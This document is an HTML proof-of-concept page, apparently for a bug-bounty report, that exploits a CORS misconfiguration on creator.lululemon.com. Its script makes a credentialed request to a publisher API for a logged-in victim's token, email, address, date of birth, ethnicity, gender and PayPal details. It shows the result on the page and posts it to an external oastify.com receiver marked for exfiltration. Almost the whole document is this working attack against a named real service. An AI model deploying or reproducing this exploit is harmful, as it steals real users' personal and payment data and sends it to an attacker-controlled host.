<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CORS Credential Leak PoC</title>
</head>

<body>
<h2>Lululemon Creator Data Exposure via CORS</h2>
<p>If you are logged in to creator.lululemon.com, your data will appear below.</p>

<pre id="output">Loading...</pre>

<script>
const target = "https://creator.lululemon.com/cfp-data/api/publisher/30678531/summary?key=Id&fields=Token%2CPartnerId%2CPublisherId%2CPublisherName%2CRegistrationCompleted%2CCampaignsCount%2CFirstName%2CLastName%2CDescription%2CLogoURL%2CEmail%2CEmail1%2CLanguage%2CStreetAddress%2CStreetAddress2%2CCountry%2CState%2CCity%2CZipCode%2CPromoCodesCount%2CLanguage2%2CEthnicBackground%2CGender%2CDateOfBirth%2CPayPalFirstName%2CPayPalLastName%2CPayPalEmail%2CPaymentTermsAcceptedAt%2CActiveCampaignsCount%2COpportunityCampaignsCount&gri=1245%3A30678531%3AS6p9Qz%3A16";

// replace with your receiver
const exfil = "https://zru0q3izyq1n47y2zo7h26lar1xslj98.oastify.com";

fetch(target, {
    method: "GET",
    credentials: "include"
})
.then(r => r.text())
.then(data => {
    // display stolen data
    document.getElementById("output").textContent = data;

    // exfiltrate
    fetch(exfil, {
        method: "POST",
        mode: "no-cors",
        body: data
    });
})
.catch(e => {
    document.getElementById("output").textContent = e;
});
</script>

</body>
</html>
